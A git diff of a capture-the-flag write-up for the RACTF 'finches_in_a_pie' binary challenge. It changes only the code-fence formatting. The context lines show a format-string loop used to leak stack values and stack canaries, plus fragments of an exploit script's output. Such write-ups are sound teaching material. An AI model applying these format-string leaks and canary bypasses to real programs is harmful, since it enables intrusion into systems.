@@ -100,7 +100,7 @@ void flag(void)
 
 We know the canary will change, but the MSB will always be 0, so let's start with getting the first 16 stack elements.
 
-```bash
+```
 kali@kali:~/Downloads/ractf/finches_in_a_pie$ for i in `seq 1 16`; do echo "%${i}\$p" | ./fiap; done | grep "Thank you, "
 Thank you, 0xf7f082c0!
 Thank you, 0x3e8!
@@ -177,7 +177,7 @@ p.sendline(payload)
 p.stream()
 ```
 
-```bash
+```
 kali@kali:~/Downloads/ractf/finches_in_a_pie$ ./exploit.py | grep -v JAVA
 [DEBUG] PLT 0x1030 printf
 [DEBUG] PLT 0x1040 gets
@@ -377,7 +377,7 @@ p.recvline()
 p.stream()
 ```
 
-```bash
+```
 kali@kali:~/Downloads/ractf/finches_in_a_pie$ ./exploit.py 
 [DEBUG] PLT 0x1030 printf
 [DEBUG] PLT 0x1040 gets
